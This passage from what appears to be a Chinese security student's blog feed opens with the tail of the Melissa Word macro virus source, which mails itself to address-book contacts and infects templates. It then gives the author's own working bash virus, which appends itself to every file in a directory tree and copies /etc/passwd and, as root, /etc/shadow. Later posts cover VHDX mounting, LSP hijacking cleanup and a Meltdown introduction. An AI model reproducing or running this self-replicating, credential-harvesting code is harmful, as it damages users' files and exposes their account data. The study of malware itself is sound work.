AddyBook.AddressEntries.Count</span><br><span class="line">            Peep = AddyBook.AddressEntries(x)</span><br><span class="line">            BreakOffASlice.Recipients.Add Peep</span><br><span class="line">            x++</span><br><span class="line">            <span class="keyword">If</span> x &lt; <span class="number">50</span> <span class="keyword">Then</span> oo = AddyBook.AddressEntries.Count</span><br><span class="line">         <span class="keyword">Next</span> oo</span><br><span class="line">         BreakOffASlice.Subject = <span class="string">"Important Message From "</span> &amp;</span><br><span class="line">              Application.UserName</span><br><span class="line">         BreakUmOffASlice.Body =</span><br><span class="line">            <span class="string">"Here is that document you asked for ... don't show anyone else ;-)"</span></span><br><span class="line"></span><br><span class="line">*** Here <span class="keyword">is</span> the classic subject line <span class="string">"Important Message From"</span> This could</span><br><span class="line">change of course <span class="keyword">in</span> future versions ***</span><br><span class="line"></span><br><span class="line">         BreakUmOffASlice.Attachments.Add ActiveDocument.FullName</span><br><span class="line">         BreakUmOffASlice.Send</span><br><span class="line">         Peep = <span class="string">""</span></span><br><span class="line">    <span class="keyword">Next</span> y</span><br><span class="line">  DasMapName.Logoff</span><br><span class="line">  <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">  System.PrivateProfileString(<span class="string">""</span>,</span><br><span class="line">      <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Office\"</span>, <span class="string">"Melissa?"</span>) =</span><br><span class="line">       <span class="string">"... by Kwyjibo"</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="comment">'Part3</span></span><br><span class="line">        <span class="comment">'病毒自我复制部分</span></span><br><span class="line">        <span class="comment">'根据情况对Active Document或Normal Template进行感染</span></span><br><span class="line">        <span class="comment">'</span></span><br><span class="line"><span class="keyword">Set</span> ADI1 = ActiveDocument.VBProject.VBComponents.Item(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">Set</span> NTI1 = NormalTemplate.VBProject.VBComponents.Item(<span class="number">1</span>)</span><br><span class="line">NTCL = NTI1.CodeModule.CountOfLines</span><br><span class="line">ADCL = ADI1.CodeModule.CountOfLines</span><br><span class="line">BGN = <span class="number">2</span></span><br><span class="line"><span class="keyword">If</span> ADI1.Name &lt;&gt; <span class="string">"Melissa"</span> <span class="keyword">Then</span></span><br><span class="line">  <span class="keyword">If</span> ADCL &gt; <span class="number">0</span> <span class="keyword">Then</span> _</span><br><span class="line">    ADI1.CodeModule.DeleteLines <span class="number">1</span>, ADCL</span><br><span class="line">    <span class="keyword">Set</span> ToInfect = ADI1</span><br><span class="line">    ADI1.Name = <span class="string">"Melissa"</span></span><br><span class="line">    DoAD = <span class="literal">True</span></span><br><span class="line">  <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">  <span class="keyword">If</span> NTI1.Name &lt;&gt; <span class="string">"Melissa"</span> <span class="keyword">Then</span></span><br><span class="line">    <span class="keyword">If</span> NTCL &gt; <span class="number">0</span> <span class="keyword">Then</span> _</span><br><span class="line">      NTI1.CodeModule.DeleteLines <span class="number">1</span>, NTCL</span><br><span class="line">      <span class="keyword">Set</span> ToInfect = NTI1</span><br><span class="line">      NTI1.Name = <span class="string">"Melissa"</span></span><br><span class="line">      DoNT = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">If</span> DoNT &lt;&gt; <span class="literal">True</span> <span class="keyword">And</span> DoAD &lt;&gt; <span class="literal">True</span> <span class="keyword">Then</span> <span class="keyword">GoTo</span> <span class="keyword">END</span></span><br><span class="line">      <span class="keyword">If</span> DoNT = <span class="literal">True</span> <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Do</span> <span class="keyword">While</span> ADI1.CodeModule.Lines(<span class="number">1</span>, <span class="number">1</span>) = <span class="string">""</span></span><br><span class="line">          ADI1.CodeModule.DeleteLines <span class="number">1</span></span><br><span class="line">        <span class="keyword">Loop</span></span><br><span class="line">        ToInfect.CodeModule.AddFromString (<span class="string">"Private Sub Document_Close()"</span>)</span><br><span class="line">        <span class="keyword">Do</span> <span class="keyword">While</span> ADI1.CodeModule.Lines(BGN, <span class="number">1</span>) &lt;&gt; <span class="string">""</span></span><br><span class="line">          ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, <span class="number">1</span>)</span><br><span class="line">          BGN = BGN + <span class="number">1</span></span><br><span class="line">        <span class="keyword">Loop</span></span><br><span class="line">      <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">      <span class="keyword">If</span> DoAD = <span class="literal">True</span> <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Do</span> <span class="keyword">While</span> NTI1.CodeModule.Lines(<span class="number">1</span>, <span class="number">1</span>) = <span class="string">""</span></span><br><span class="line">          NTI1.CodeModule.DeleteLines <span class="number">1</span></span><br><span class="line">        <span class="keyword">Loop</span></span><br><span class="line">        ToInfect.CodeModule.AddFromString (<span class="string">"Private Sub Document_Open()"</span>)</span><br><span class="line">        <span class="keyword">Do</span> <span class="keyword">While</span> NTI1.CodeModule.Lines(BGN, <span class="number">1</span>) &lt;&gt; <span class="string">""</span></span><br><span class="line">          ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(<span class="keyword">END</span>, <span class="number">1</span>)</span><br><span class="line">            BGN = BGN + <span class="number">1</span></span><br><span class="line">        <span class="keyword">Loop</span></span><br><span class="line">      <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">CYA:</span><br><span class="line">      <span class="keyword">If</span> NTCL &lt;&gt; <span class="number">0</span> <span class="keyword">And</span> ADCL = <span class="number">0</span> <span class="keyword">And</span></span><br><span class="line">          (<span class="built_in">InStr</span>(<span class="number">1</span>, ActiveDocument.Name, <span class="string">"Document"</span>) = <span class="literal">False</span>) <span class="keyword">Then</span></span><br><span class="line">        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName</span><br><span class="line">      <span class="keyword">ElseIf</span> (<span class="built_in">InStr</span>(<span class="number">1</span>, ActiveDocument.Name, <span class="string">"Document"</span>) &lt;&gt; <span class="literal">False</span>) <span class="keyword">Then</span></span><br><span class="line">        ActiveDocument.Saved = <span class="literal">True</span></span><br><span class="line">      <span class="keyword">End</span> <span class="keyword">If</span>    </span><br><span class="line"><span class="comment">'Part4</span></span><br><span class="line"><span class="comment">'假如午时已到，告诉感染者你已经被感染23333333333</span></span><br><span class="line"><span class="comment">'</span></span><br><span class="line"><span class="comment">'WORD/Melissa written by Kwyjibo</span></span><br><span class="line"><span class="comment">'Works in both Word 2000 and Word 97</span></span><br><span class="line"><span class="comment">'Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!</span></span><br><span class="line"><span class="comment">'Word -&gt; Email | Word 97 &lt;--&gt; Word 2000 ... it's a new age!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">Day</span>(<span class="built_in">Now</span>) = <span class="built_in">Minute</span>(<span class="built_in">Now</span>) <span class="keyword">Then</span> Selection.TypeText <span class="string">" Twenty-two points,</span></span><br><span class="line"><span class="string">    plus triple-word-score, plus fifty points for using all my letters.</span></span><br><span class="line"><span class="string">    Game's over.  I'm outta here."</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><h3 id="写一个bash病毒"><a href="#写一个bash病毒" class="headerlink" title="写一个bash病毒"></a>写一个bash病毒</h3><p>附：现shell脚本：<a href="https://www.runoob.com/linux/linux-shell.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-shell.html</a></p><blockquote><p>注意变量赋值之间没有空格，踩坑踩了很久才发现</p></blockquote><p> 实现了感染目录下将自身复制到每个文件里，并记录感染文件至<code>.bak/filelist_log</code></p><p>并获取信息到<code>.bak/info</code>目录下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#MagicFuck</span></span><br><span class="line"></span><br><span class="line">whoami=<span class="string">"<span class="variable">$(whoami)</span>"</span></span><br><span class="line">path=<span class="string">"<span class="variable">$(pwd)</span>"</span></span><br><span class="line">file_list=$(ls <span class="variable">$path</span>)</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"<span class="variable">$whoami</span> in <span class="variable">$path</span> fucking your file\n"</span></span><br><span class="line">touch /tmp/v_tmp</span><br><span class="line">tmp=<span class="string">'/tmp/v_tmp'</span></span><br><span class="line">cat <span class="string">"<span class="variable">$path</span>/<span class="variable">$0</span>"</span> &gt; <span class="variable">$tmp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># backup</span></span><br><span class="line">mkdir .bak</span><br><span class="line">cp -r * .bak</span><br><span class="line">mkdir <span class="variable">$path</span>/.bak/info</span><br><span class="line">touch <span class="variable">$path</span>/.bak/info/filelist_log</span><br><span class="line"></span><br><span class="line">cat /proc/meminfo &gt;&gt; <span class="variable">$path</span>/.bak/info/meminfo</span><br><span class="line">cat /proc/cpuinfo &gt;&gt; <span class="variable">$path</span>/.bak/info/cpuinfo</span><br><span class="line">cat /etc/hostname &gt;&gt; <span class="variable">$path</span>/.bak/info/hostname</span><br><span class="line">cat /etc/passwd &gt;&gt; <span class="variable">$path</span>/.bak/info/passwd</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$whoami</span> = <span class="string">'root'</span>;</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">4touch <span class="variable">$path</span>/.bak/info/shadow</span><br><span class="line">4cat /etc/shadow &gt;&gt; <span class="variable">$path</span>/.bak/info/shadow</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">fuckfile</span></span>()&#123;</span><br><span class="line">4file_list=$(ls <span class="variable">$pwd</span>)</span><br><span class="line">4<span class="built_in">echo</span> $(ls <span class="variable">$pwd</span>) &gt;&gt; <span class="variable">$path</span>/.bak/filelist_log</span><br><span class="line">4<span class="keyword">for</span> file_ <span class="keyword">in</span> $(ls <span class="variable">$pwd</span>); <span class="keyword">do</span></span><br><span class="line">44<span class="comment"># echo $file_</span></span><br><span class="line">44<span class="keyword">if</span> <span class="built_in">test</span> -d <span class="variable">$file_</span></span><br><span class="line">444<span class="keyword">then</span></span><br><span class="line">4444<span class="built_in">echo</span> <span class="string">"<span class="variable">$file_</span> is dir"</span></span><br><span class="line">4444<span class="keyword">if</span> $(cat <span class="variable">$file_</span> |grep -q <span class="string">".bak"</span>)</span><br><span class="line">4444<span class="keyword">then</span></span><br><span class="line">44444<span class="built_in">echo</span> <span class="string">"It's Magic bak"</span></span><br><span class="line">4444<span class="keyword">else</span></span><br><span class="line">44444<span class="built_in">cd</span> ./<span class="variable">$file_</span></span><br><span class="line">44444fuckfile</span><br><span class="line">44444<span class="built_in">cd</span> ..</span><br><span class="line">4444<span class="keyword">fi</span></span><br><span class="line">444<span class="keyword">else</span></span><br><span class="line">4444<span class="keyword">if</span> $(cat <span class="variable">$file_</span> |grep -q <span class="string">"MagicFuck"</span>)</span><br><span class="line">4444<span class="keyword">then</span></span><br><span class="line">44444<span class="built_in">echo</span> <span class="string">"It has Magic"</span></span><br><span class="line">4444<span class="keyword">else</span> </span><br><span class="line">44444cat <span class="variable">$tmp</span> &gt;&gt; <span class="variable">$file_</span></span><br><span class="line">444<span class="keyword">fi</span></span><br><span class="line">44<span class="keyword">fi</span></span><br><span class="line">4<span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fuckfile</span><br><span class="line">rm <span class="variable">$tmp</span></span><br></pre></td></tr></table></figure><p>通过劫持hook实现键盘记录器：<a href="https://blog.csdn.net/simon798/article/details/98848050" target="_blank" rel="noopener">https://blog.csdn.net/simon798/article/details/98848050</a></p><h3 id="二进制文件病毒：binary-file-virus"><a href="#二进制文件病毒：binary-file-virus" class="headerlink" title="二进制文件病毒：binary file virus"></a>二进制文件病毒：binary file virus</h3><p>### </p><p>该病毒以寄生方式挂接到二进制可执行文件（不管该文件能否直接执行）。二进制可执行文件包含可由 CPU 直接解释的二进制指令。这些类型的病毒通常称为文件感染型病毒。</p>]]></content>
      
      
      <categories>
          
          <category> Virus </category>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Virtual_hard_disk</title>
      <link href="/2020/03/30/Virtual-hard-disk/"/>
      <url>/2020/03/30/Virtual-hard-disk/</url>
      
        <content type="html"><![CDATA[<h1 id="Virtual-Hard-Disk"><a href="#Virtual-Hard-Disk" class="headerlink" title="Virtual Hard Disk"></a>Virtual Hard Disk</h1><p>一直很好奇老师用的<code>.vhdx</code>是啥，知道他发来了一个<code>.vhdx</code>文件格式的东西我才开始了解</p><blockquote><p>资料：</p><p><a href="https://en.wikipedia.org/wiki/VHD_(file_format" target="_blank" rel="noopener">vhdx-wiki</a>)</p><p><a href="https://www.altaro.com/hyper-v/understanding-working-vhdx-files/" target="_blank" rel="noopener">Understanding and Working with VHD(X) Files</a></p><p><a href="https://www.cnblogs.com/strayromeo/p/8872255.html" target="_blank" rel="noopener">windows的虚拟磁盘（vhd，vhdx）使用</a></p><p><a href="https://gist.github.com/allenyllee/0a4c02952bf695470860b27369bbb60d" target="_blank" rel="noopener">linux 挂在vhdx的方法</a></p><p><a href="https://www.cnblogs.com/oloroso/p/6385398.html" target="_blank" rel="noopener">linux下挂载VHD等虚拟磁盘文件</a></p></blockquote><p>vhd是一种虚拟硬盘的文件格式，他可以包含能在物理HDD上找到的内容，比如磁盘分区和文件系统，也可以包含文件夹和文件，通常用作虚拟机的硬盘，而vhdx是第二代的vhd，在性能上也有所不同</p><ul><li>vhdx在windows 8和windows server 2012之后被支持</li><li>vhd的容量限制为2040GB，而vhdx最多为64TB</li><li>vhdx可防止电源故障，并由hyper-V使用</li></ul><p>功能有：</p><ul><li>在vhd和主机文件系统之间移动文件</li><li>备份与还原</li><li>防病毒和安全性</li><li>图像管理和修补</li><li>磁盘转换：物理到虚拟，虚拟到物理</li><li>生命周期管理和重新配置</li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Virtual-hard-disk/VHDX-Visual.png" alt></p><p>VHDX模拟硬盘，与文件系统的格式无关，也与分区无关。vhdx具有与物理硬盘驱动器相同的特征。假如创建一个ntfs格式的vhdx就如上图所示</p><h4 id="老师给的vhdx使用攻略"><a href="#老师给的vhdx使用攻略" class="headerlink" title="老师给的vhdx使用攻略"></a>老师给的vhdx使用攻略</h4><p>由于我的硬盘快炸了就不实验这个了</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">下载vhdx文件，放到一个妥帖的地方备份先。</span><br><span class="line">一个有空闲80G以上的硬盘比如E:，解压缩vhdx放到e:下</span><br><span class="line">“以管理员身份”运行“命令提示符”，执行：</span><br><span class="line">bcdedit /copy &#123;current&#125; -d "windows 10 x64 v2004 20h1 b19041"</span><br><span class="line">会返回一个uuid，像这样子：</span><br><span class="line">&#123;78088406<span class="string">-4</span>d9e<span class="string">-11</span>e9<span class="string">-951</span>e<span class="string">-97</span>df5fa30904&#125;</span><br><span class="line">然后继续执行（注意uuid换成你返回的）（注意把E换成你的盘符，大括号中括号要保持不要删）</span><br><span class="line">bcdedit /set &#123;78088406<span class="string">-4</span>d9e<span class="string">-11</span>e9<span class="string">-951</span>e<span class="string">-97</span>df5fa30904&#125; osdevice vhd=[e:]\Windows10x64-v2004<span class="string">-20</span>h1-b19041.vhdx</span><br><span class="line">bcdedit /set &#123;78088406<span class="string">-4</span>d9e<span class="string">-11</span>e9<span class="string">-951</span>e<span class="string">-97</span>df5fa30904&#125; device vhd=[e:]\Windows10x64-v2004<span class="string">-20</span>h1-b19041.vhdx</span><br><span class="line">bcdedit /set &#123;78088406<span class="string">-4</span>d9e<span class="string">-11</span>e9<span class="string">-951</span>e<span class="string">-97</span>df5fa30904&#125; hypervisorlaunchtype OFF</span><br><span class="line">然后重开机，注意有个开机选择菜单，</span><br><span class="line">选这个v2004即可进入新的windows</span><br><span class="line">不选或直接回车的话，会继续旧的windows。</span><br><span class="line">将来如果想删掉，直接把vhdx删掉就完事了。</span><br><span class="line"></span><br><span class="line">附</span><br><span class="line">$ md5sum W*</span><br><span class="line">52cd80b26541bb92e306291362a930cb *Windows10x64-v2004<span class="string">-20</span>h1-b19041.7z</span><br><span class="line">fc99df570f50bd7b4cfd0b08a905a11e *Windows10x64-v2004<span class="string">-20</span>h1-b19041.vhdx</span><br></pre></td></tr></table></figure><h4 id="windows下使用"><a href="#windows下使用" class="headerlink" title="windows下使用"></a>windows下使用</h4><p>windows下可以用磁盘管理去创建或附加</p><p>右键开始菜单或者<code>win</code>+<code>R</code>运行<code>diskmgmt.msc</code>命令，打开磁盘管理工具</p><p>选择一个硬盘，在菜单中点击操作，创建VHD即可</p><h4 id="Linux下使用"><a href="#Linux下使用" class="headerlink" title="Linux下使用"></a>Linux下使用</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file:install_tools.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># install qemu utils</span></span><br><span class="line">sudo apt install qemu-utils</span><br><span class="line"></span><br><span class="line"><span class="comment"># install nbd client</span></span><br><span class="line">sudo apt install nbd-client</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------</span></span><br><span class="line"><span class="comment">#file:mount_vhdx.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">VHDX_IMG=<span class="string">"<span class="variable">$1</span>"</span></span><br><span class="line">MOUNT_POINT=<span class="string">"<span class="variable">$2</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [ubuntu] How do you mount a VHD image</span></span><br><span class="line"><span class="comment"># https://ubuntuforums.org/showthread.php?t=2299701</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Load the nbd kernel module.</span></span><br><span class="line">sudo rmmod nbd;sudo modprobe nbd max_part=16</span><br><span class="line"></span><br><span class="line"><span class="comment"># mount block device</span></span><br><span class="line">sudo qemu-nbd -c /dev/nbd0 <span class="string">"<span class="variable">$VHDX_IMG</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reload partition table</span></span><br><span class="line">sudo partprobe /dev/nbd0</span><br><span class="line"></span><br><span class="line"><span class="comment"># mount partition</span></span><br><span class="line">sudo mount -o rw,nouser /dev/nbd0p1 <span class="string">"<span class="variable">$MOUNT_POINT</span>"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------------------------------------</span></span><br><span class="line"><span class="comment">#file:unmount_vhdx.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">MOUNT_POINT=<span class="string">"<span class="variable">$1</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#unmount &amp; remove nbd module</span></span><br><span class="line">sudo umount <span class="string">"<span class="variable">$MOUNT_POINT</span>"</span> &amp;&amp; sudo qemu-nbd -d /dev/nbd0 &amp;&amp; sudo rmmod nbd</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>lsp-hijack</title>
      <link href="/2020/03/25/lsp-hijack/"/>
      <url>/2020/03/25/lsp-hijack/</url>
      
        <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>原本只是想白嫖免费的腾讯加速器，用完卸了，没想到还卸载不了。</p><p>其中有两个dll删除时总是显示正在运行中，用<code>tasklist /m xxx.dll</code>查看运行dll的进程，一一终止，然后把他删了。</p><p>然后发现，我网络炸了？？？</p><p>ssr也被加速器顺便给炸了，显示绑定了另外一个端口</p><blockquote><p>参考：</p><p><a href="https://baike.baidu.com/item/LSP/2970?fromtitle=LSP协议&amp;fromid=807563&amp;fr=aladdin" target="_blank" rel="noopener">分层服务提供程序</a></p><p><a href="https://en.wikipedia.org/wiki/Layered_Service_Provider" target="_blank" rel="noopener">LSP-wiki</a></p><p><a href="https://blog.csdn.net/sspdfn/article/details/86520816" target="_blank" rel="noopener">LSP劫持与网络数据转发代理服务器的心得笔记</a></p></blockquote><p>Winsock LSP全称Windows Socket Layered Service Provider(分层服务提供商)，它是Windows底层网络Socker通信需要经过的大门。一些流氓软件可以把自已加进去，就可以截取、访问、修改网络的数据包，可以随意添加广告，还能获取你的浏览习惯.如果加进的是木马，后果可想而知。而且因为LSP工作在底层，所以无论你用什么浏览器，都逃不了经过它。而LSP中的dll文件被删除后，就会出现无法上网的情况。</p><p>Winsock LSP 可用于非常广泛的实用用途，包括 Internet <a href="https://baike.baidu.com/item/家长控制/1466292" target="_blank" rel="noopener">家长控制</a> (parental control) 和 Web 内容筛选。在以前版本的 Windows XP 中，删除不正确的（也称为“buggy”）LSP 可能会导致注册表中的 Winsock 目录损坏，潜在的导致所有网络连接的丢失。 LSP就是TCP/IP等协议的接口．LSP用在正途上可以方便程序员们编写监视系统网络通讯情况的Sniffer，可是现在常见的LSP都被用于<a href="https://baike.baidu.com/item/浏览器劫持/1798451" target="_blank" rel="noopener">浏览器劫持</a>。</p><p>现在大多加速器，尤其以腾讯系为主的大多应用（腾讯加速器，TGP(现wegame)，都是以lsp劫持到自己的节点进行加速</p><p>非正常卸载(比如强行删除加速器文件)通常会带来无法上网的问题。</p><blockquote><p>如何编写lsp劫持：</p><p><a href="https://blog.csdn.net/Aaron133/article/details/78028942" target="_blank" rel="noopener">https://blog.csdn.net/Aaron133/article/details/78028942</a></p><p><a href="https://www.cnblogs.com/freesec/p/6541725.html" target="_blank" rel="noopener">https://www.cnblogs.com/freesec/p/6541725.html</a></p><p><a href="https://www.cnblogs.com/hjbf/p/10195244.html" target="_blank" rel="noopener">https://www.cnblogs.com/hjbf/p/10195244.html</a></p><p><a href="https://blog.csdn.net/sspdfn/article/details/86520816" target="_blank" rel="noopener">https://blog.csdn.net/sspdfn/article/details/86520816</a></p></blockquote><p>windows10 解决办法</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netsh winsock reset</span><br></pre></td></tr></table></figure><p>PS：用ping检查网络状况</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1(判断本地tcp/ip协议是否正常)，</span><br><span class="line"><span class="comment">#ping  本地ip (判断网卡是否正常)，</span></span><br><span class="line">ping  gateway_ip <span class="comment"># 网关(判断路由器是否正常)，</span></span><br><span class="line">ping  14.215.177.39 <span class="comment"># 外网ip，百度的ip (判断网络连接是否正常),  </span></span><br><span class="line">ping  baidu.com <span class="comment"># 外网域名(判断DNS是否正常)，</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Meltdown And Hardware Security</title>
      <link href="/2020/03/21/Meltdown-And-Hardware-Security/"/>
      <url>/2020/03/21/Meltdown-And-Hardware-Security/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>由于新型冠状病毒，美股多次熔断，我们的安全课也提到了熔断一词：Meltdown，将其与硬件安全联系在了一起</p><p>Meltdown，源自于2018年1月3日的两组CPU芯片漏洞之一</p><blockquote><p>2018年1月3日，Google Project Zero（GPZ）团队安全研究员Jann Horn在其团队博客中爆出CPU芯片的两组漏洞，分别是Meltdown与Spectre。</p></blockquote><p><strong>Meltdown对应CVE-2017-5754（乱序执行缓存污染），Spectre对应CVE-2017-5753（边界检查绕过）与CVE-2017-5715（分支目标注入）。看CVE编号就能知道，这两组漏洞早在2017年6月就已经由GPZ团队向英特尔提交，而在差不多时间由Lipp等人发布的论文Meltdown与Spectre Attacks也详细描述了这一攻击，从文中的声明来看，Lipp等人与GPZ团队似乎是独立发现了这两组漏洞。</strong></p><p>Meltdown漏洞影响几乎所有的Intel CPU和部分ARM CPU，而Spectre则影响所有的Intel CPU和AMD CPU，以及主流的ARM CPU。从个人电脑、服务器、云计算机服务器到移动端的智能手机，都受到这两组硬件漏洞的影响。</p><p>总所周知，软件更换肯定比硬件更换容易，软件某个版本有了bug或漏洞，我们大可换其版本，重装就完事了，或者不用他且罢，但是对于硬件级的漏洞，我们也只能从软件层面修复打补丁，或者也就只能等着修复了漏洞的新版CPU发布了，不过换CPU也是一件麻烦事。</p><blockquote><p>参考：</p><p><a href="https://meltdownattack.com/" target="_blank" rel="noopener">Meltdown and Spectre</a></p><p><a href="https://github.com/IAIK/meltdown" target="_blank" rel="noopener">Github - IAIK / meltdown</a></p><p><a href="https://github.com/paboldin/meltdown-exploit" target="_blank" rel="noopener">Github - paboldin / meltdown-exploit</a></p><p><a href="https://github.com/speed47/spectre-meltdown-checker" target="_blank" rel="noopener">Github - speed47 / spectre-meltdown-checker</a></p><p><a href="Meltdown-And-Hardware-Security/meltdown.pdf">Meltdown.pdf——漏洞发现者的论文</a></p><p><a href="https://blog.csdn.net/jus3ve/article/details/79202105" target="_blank" rel="noopener">Meltdown.pdf——论文翻译</a></p><p><a href="https://www.freebuf.com/articles/system/159811.html" target="_blank" rel="noopener">一步一步理解CPU芯片漏洞：Meltdown与Spectre</a>：其中分析的exp是这个<a href="https://github.com/paboldin/meltdown-exploit" target="_blank" rel="noopener">Github - paboldin / meltdown-exploit</a></p><p><a href="https://www.anquanke.com/post/id/148119" target="_blank" rel="noopener">Meltdown漏洞利用解读（Part 1）：基础篇</a></p><p><a href="https://mp.weixin.qq.com/s/zlspXeDGlAEzVsq2h6gg8w" target="_blank" rel="noopener">首发：Meltdown漏洞分析与实践</a></p><p><a href="https://www.freebuf.com/column/161135.html" target="_blank" rel="noopener">理解CPU Spectre漏洞</a></p><p><a href="https://zhuanlan.zhihu.com/p/32757727" target="_blank" rel="noopener">解读 Meltdown &amp; Spectre CPU 漏洞</a></p><p><a href="https://zhuanlan.zhihu.com/p/32784852" target="_blank" rel="noopener">给程序员解释Spectre和Meltdown漏洞</a></p><p>修复：</p><p><a href="https://www.freebuf.com/articles/system/159577.html" target="_blank" rel="noopener">史上最大CPU漏洞Meltdown &amp; Spectre 影响与修复指南</a></p></blockquote><h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 